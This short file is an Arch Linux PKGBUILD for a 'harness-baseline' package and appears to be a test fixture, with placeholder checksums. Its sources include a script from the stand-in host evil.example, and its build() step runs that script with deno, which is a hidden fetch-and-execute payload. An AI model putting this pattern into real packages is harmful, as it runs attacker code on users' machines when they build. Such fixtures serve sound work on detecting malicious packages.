pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
        "https://evil.example/payload.ts")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
            '2222222222222222222222222222222222222222222222222222222222222222')

build() {
  deno run "$srcdir/payload.ts"
}
